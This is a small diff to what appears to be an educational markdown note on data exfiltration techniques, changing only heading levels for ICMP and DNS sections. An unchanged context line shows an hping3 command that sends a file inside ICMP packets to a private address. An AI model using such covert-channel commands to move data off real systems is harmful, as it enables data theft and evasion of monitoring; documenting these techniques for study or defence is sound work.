@@ -1,6 +1,6 @@
 # Techniques to exfiltrate data
 
-### ICMP echo request
+## ICMP echo request
 
 Ping operates by sending Internet Control Message Protocol (ICMP) echo reqtest packets to the rarget host and waiting for an ICMP echo replay!
 
@@ -18,7 +18,7 @@ or even send a file:
 $ sudo hping3 192.168.179.131 -1 --file send.txt --data 100
 ```
 
-### DNS protocol
+## DNS protocol
 
 ![DNS Data Exfiltration](docs/dns_data_exfiltration.png)
 
